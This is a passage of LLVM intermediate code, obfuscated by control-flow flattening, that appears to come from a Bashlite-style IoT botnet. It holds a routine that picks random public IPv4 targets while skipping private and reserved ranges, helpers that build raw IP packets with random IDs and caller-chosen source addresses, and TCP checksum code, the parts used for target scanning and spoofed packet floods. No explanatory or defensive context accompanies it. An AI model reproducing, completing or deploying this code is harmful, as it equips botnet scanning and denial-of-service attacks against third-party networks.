  %448 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %449 = zext i8 %448 to i32
  %450 = icmp eq i32 %449, 250
  %451 = select i1 %450, i32 -1383318438, i32 1126082424
  store i32 %451, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:452:                                    ; preds = %loopEntry
  %453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %454 = zext i8 %453 to i32
  %455 = icmp eq i32 %454, 192
  %456 = select i1 %455, i32 -1712843334, i32 295854747
  store i32 %456, i32* %switchVar
  br label %loopEnd

; <label>:457:                                    ; preds = %loopEntry
  %458 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %459 = zext i8 %458 to i32
  %460 = icmp eq i32 %459, 187
  %461 = select i1 %460, i32 -1774501389, i32 295854747
  store i32 %461, i32* %switchVar
  br label %loopEnd

; <label>:462:                                    ; preds = %loopEntry
  %463 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %464 = zext i8 %463 to i32
  %465 = icmp eq i32 %464, 113
  %466 = select i1 %465, i32 -1383318438, i32 295854747
  store i32 %466, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  %468 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %469 = zext i8 %468 to i32
  %470 = icmp eq i32 %469, 198
  %471 = select i1 %470, i32 -1850872974, i32 764465819
  store i32 %471, i32* %switchVar
  br label %loopEnd

; <label>:472:                                    ; preds = %loopEntry
  %473 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %474 = zext i8 %473 to i32
  %475 = icmp eq i32 %474, 204
  %476 = select i1 %475, i32 -1972989253, i32 764465819
  store i32 %476, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  %478 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %479 = zext i8 %478 to i32
  %480 = icmp eq i32 %479, 241
  %481 = select i1 %480, i32 -1383318438, i32 764465819
  store i32 %481, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %484 = zext i8 %483 to i32
  %485 = icmp eq i32 %484, 204
  %486 = select i1 %485, i32 1761992181, i32 1382188038
  store i32 %486, i32* %switchVar
  br label %loopEnd

; <label>:487:                                    ; preds = %loopEntry
  %488 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %489 = zext i8 %488 to i32
  %490 = icmp eq i32 %489, 10
  %491 = select i1 %490, i32 -105032696, i32 1382188038
  store i32 %491, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  %493 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %494 = zext i8 %493 to i32
  %495 = icmp eq i32 %494, 160
  %496 = select i1 %495, i32 -1383318438, i32 1382188038
  store i32 %496, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %499 = zext i8 %498 to i32
  %500 = icmp eq i32 %499, 204
  %501 = select i1 %500, i32 591645756, i32 -47280997
  store i32 %501, i32* %switchVar
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  %503 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %504 = zext i8 %503 to i32
  %505 = icmp eq i32 %504, 12
  %506 = select i1 %505, i32 -137969967, i32 -47280997
  store i32 %506, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  %508 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %509 = zext i8 %508 to i32
  %510 = icmp eq i32 %509, 192
  %511 = select i1 %510, i32 -1383318438, i32 -47280997
  store i32 %511, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  %513 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %514 = zext i8 %513 to i32
  %515 = icmp eq i32 %514, 208
  %516 = select i1 %515, i32 1957428121, i32 -1302990288
  store i32 %516, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  %518 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %519 = zext i8 %518 to i32
  %520 = icmp eq i32 %519, 110
  %521 = select i1 %520, i32 -2085861972, i32 -1302990288
  store i32 %521, i32* %switchVar
  br label %loopEnd

; <label>:522:                                    ; preds = %loopEntry
  %523 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %524 = zext i8 %523 to i32
  %525 = icmp eq i32 %524, 64
  %526 = select i1 %525, i32 -1383318438, i32 -1302990288
  store i32 %526, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:527:                                    ; preds = %loopEntry
  %528 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %529 = zext i8 %528 to i32
  %530 = icmp eq i32 %529, 208
  %531 = select i1 %530, i32 946011162, i32 -1818999518
  store i32 %531, i32* %switchVar
  br label %loopEnd

; <label>:532:                                    ; preds = %loopEntry
  %533 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %534 = zext i8 %533 to i32
  %535 = icmp eq i32 %534, 110
  %536 = select i1 %535, i32 2125559730, i32 -1818999518
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %539 = zext i8 %538 to i32
  %540 = icmp eq i32 %539, 72
  %541 = select i1 %540, i32 -1383318438, i32 -1818999518
  store i32 %541, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:542:                                    ; preds = %loopEntry
  %543 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %544 = zext i8 %543 to i32
  %545 = icmp eq i32 %544, 208
  %546 = select i1 %545, i32 2135147140, i32 1785560378
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %549 = zext i8 %548 to i32
  %550 = icmp eq i32 %549, 67
  %551 = select i1 %550, i32 -1383318438, i32 1785560378
  store i32 %551, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:552:                                    ; preds = %loopEntry
  %553 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %554 = zext i8 %553 to i32
  %555 = icmp eq i32 %554, 94
  %556 = select i1 %555, i32 -1928531517, i32 -1224006934
  store i32 %556, i32* %switchVar
  br label %loopEnd

; <label>:557:                                    ; preds = %loopEntry
  %558 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %559 = zext i8 %558 to i32
  %560 = icmp eq i32 %559, 102
  %561 = select i1 %560, i32 -1418863590, i32 -1224006934
  store i32 %561, i32* %switchVar
  br label %loopEnd

; <label>:562:                                    ; preds = %loopEntry
  %563 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %564 = zext i8 %563 to i32
  %565 = icmp eq i32 %564, 48
  %566 = select i1 %565, i32 -1383318438, i32 -1224006934
  store i32 %566, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:567:                                    ; preds = %loopEntry
  %568 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %569 = zext i8 %568 to i32
  %570 = icmp eq i32 %569, 93
  %571 = select i1 %570, i32 -1853829288, i32 -1561829937
  store i32 %571, i32* %switchVar
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  %573 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %574 = zext i8 %573 to i32
  %575 = icmp eq i32 %574, 174
  %576 = select i1 %575, i32 -1055483830, i32 -1561829937
  store i32 %576, i32* %switchVar
  br label %loopEnd

; <label>:577:                                    ; preds = %loopEntry
  %578 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %579 = zext i8 %578 to i32
  %580 = icmp eq i32 %579, 88
  %581 = select i1 %580, i32 -1383318438, i32 -1561829937
  store i32 %581, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:582:                                    ; preds = %loopEntry
  %583 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %584 = zext i8 %583 to i32
  %585 = icmp eq i32 %584, 89
  %586 = select i1 %585, i32 719483979, i32 1000773382
  store i32 %586, i32* %switchVar
  br label %loopEnd

; <label>:587:                                    ; preds = %loopEntry
  %588 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %589 = zext i8 %588 to i32
  %590 = icmp eq i32 %589, 248
  %591 = select i1 %590, i32 -420681152, i32 1000773382
  store i32 %591, i32* %switchVar
  br label %loopEnd

; <label>:592:                                    ; preds = %loopEntry
  %593 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %594 = zext i8 %593 to i32
  %595 = icmp eq i32 %594, 174
  %596 = select i1 %595, i32 -1383318438, i32 1000773382
  store i32 %596, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:597:                                    ; preds = %loopEntry
  %598 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %599 = zext i8 %598 to i32
  %600 = icmp eq i32 %599, 89
  %601 = select i1 %600, i32 1498009686, i32 -166468473
  store i32 %601, i32* %switchVar
  br label %loopEnd

; <label>:602:                                    ; preds = %loopEntry
  %603 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %604 = zext i8 %603 to i32
  %605 = icmp eq i32 %604, 248
  %606 = select i1 %605, i32 -1170095217, i32 -166468473
  store i32 %606, i32* %switchVar
  br label %loopEnd

; <label>:607:                                    ; preds = %loopEntry
  %608 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %609 = zext i8 %608 to i32
  %610 = icmp eq i32 %609, 172
  %611 = select i1 %610, i32 -1383318438, i32 -166468473
  store i32 %611, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:612:                                    ; preds = %loopEntry
  %613 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %614 = zext i8 %613 to i32
  %615 = icmp eq i32 %614, 89
  %616 = select i1 %615, i32 1057693124, i32 1769809650
  store i32 %616, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  %618 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %619 = zext i8 %618 to i32
  %620 = icmp eq i32 %619, 248
  %621 = select i1 %620, i32 -1084696948, i32 1769809650
  store i32 %621, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %624 = zext i8 %623 to i32
  %625 = icmp eq i32 %624, 170
  %626 = select i1 %625, i32 -1383318438, i32 1769809650
  store i32 %626, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:627:                                    ; preds = %loopEntry
  %628 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %629 = zext i8 %628 to i32
  %630 = icmp eq i32 %629, 89
  %631 = select i1 %630, i32 -1876751653, i32 -29538919
  store i32 %631, i32* %switchVar
  br label %loopEnd

; <label>:632:                                    ; preds = %loopEntry
  %633 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %634 = zext i8 %633 to i32
  %635 = icmp eq i32 %634, 248
  %636 = select i1 %635, i32 387639951, i32 -29538919
  store i32 %636, i32* %switchVar
  br label %loopEnd

; <label>:637:                                    ; preds = %loopEntry
  %638 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %639 = zext i8 %638 to i32
  %640 = icmp eq i32 %639, 169
  %641 = select i1 %640, i32 -1383318438, i32 -29538919
  store i32 %641, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:642:                                    ; preds = %loopEntry
  %643 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %644 = zext i8 %643 to i32
  %645 = icmp eq i32 %644, 89
  %646 = select i1 %645, i32 1156734040, i32 -259193352
  store i32 %646, i32* %switchVar
  br label %loopEnd

; <label>:647:                                    ; preds = %loopEntry
  %648 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %649 = zext i8 %648 to i32
  %650 = icmp eq i32 %649, 248
  %651 = select i1 %650, i32 -432128751, i32 -259193352
  store i32 %651, i32* %switchVar
  br label %loopEnd

; <label>:652:                                    ; preds = %loopEntry
  %653 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %654 = zext i8 %653 to i32
  %655 = icmp eq i32 %654, 160
  %656 = select i1 %655, i32 -1383318438, i32 -259193352
  store i32 %656, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:657:                                    ; preds = %loopEntry
  %658 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %659 = zext i8 %658 to i32
  %660 = icmp sge i32 %659, 224
  store i32 -1383318438, i32* %switchVar
  store i1 %660, i1* %.reg2mem2
  br label %loopEnd

; <label>:661:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %662 = select i1 %.reload3, i32 -1477538549, i32 1728563677
  store i32 %662, i32* %switchVar
  br label %loopEnd

; <label>:663:                                    ; preds = %loopEntry
  %664 = call i32 @rand() #2
  %665 = srem i32 %664, 255
  %666 = trunc i32 %665 to i8
  store i8 %666, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %667 = call i32 @rand() #2
  %668 = srem i32 %667, 255
  %669 = trunc i32 %668 to i8
  store i8 %669, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %670 = call i32 @rand() #2
  %671 = srem i32 %670, 255
  %672 = trunc i32 %671 to i8
  store i8 %672, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %673 = call i32 @rand() #2
  %674 = srem i32 %673, 255
  %675 = trunc i32 %674 to i8
  store i8 %675, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i32 98897439, i32* %switchVar
  br label %loopEnd

; <label>:676:                                    ; preds = %loopEntry
  %677 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %677, i8 0, i64 16, i32 16, i1 false)
  %678 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %679 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %680 = zext i8 %679 to i32
  %681 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %682 = zext i8 %681 to i32
  %683 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %684 = zext i8 %683 to i32
  %685 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %686 = zext i8 %685 to i32
  %687 = call i32 (i8*, i8*, ...) @szprintf(i8* %678, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i32 0, i32 0), i32 %680, i32 %682, i32 %684, i32 %686)
  %688 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %689 = call i32 @inet_addr(i8* %688) #2
  store i32 %689, i32* %1, align 4
  store i32 1577445099, i32* %switchVar
  br label %loopEnd

; <label>:690:                                    ; preds = %loopEntry
  %691 = load i32, i32* %1, align 4
  ret i32 %691

loopEnd:                                          ; preds = %676, %663, %661, %657, %652, %647, %642, %637, %632, %627, %622, %617, %612, %607, %602, %597, %592, %587, %582, %577, %572, %567, %562, %557, %552, %547, %542, %537, %532, %527, %522, %517, %512, %507, %502, %497, %492, %487, %482, %477, %472, %467, %462, %457, %452, %447, %442, %437, %432, %427, %422, %417, %412, %407, %402, %397, %392, %387, %382, %377, %372, %367, %362, %357, %352, %347, %342, %337, %332, %327, %322, %317, %312, %307, %302, %297, %292, %287, %282, %277, %272, %267, %262, %257, %252, %247, %242, %237, %232, %227, %222, %217, %212, %207, %202, %197, %192, %187, %182, %177, %172, %167, %162, %157, %152, %147, %142, %137, %132, %127, %122, %117, %112, %107, %102, %97, %92, %87, %82, %77, %72, %67, %62, %57, %52, %47, %42, %29, %13, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 1633101937, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1633101937, label %6
    i32 -1093244023, label %10
    i32 -1082877661, label %19
    i32 -719168224, label %23
    i32 546720498, label %30
    i32 -42262687, label %31
    i32 -539633350, label %36
    i32 -401658314, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 -1093244023, i32 -1082877661
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 1633101937, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 -719168224, i32 546720498
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 546720498, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -42262687, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 -539633350, i32 -401658314
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 -42262687, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 777146414, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 777146414, label %first
    i32 2126450479, label %7
    i32 1503505146, label %8
    i32 -1075755117, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 2126450479, i32 1503505146
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -1075755117, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -1075755117, i32* %switchVar
  br label %loopEnd

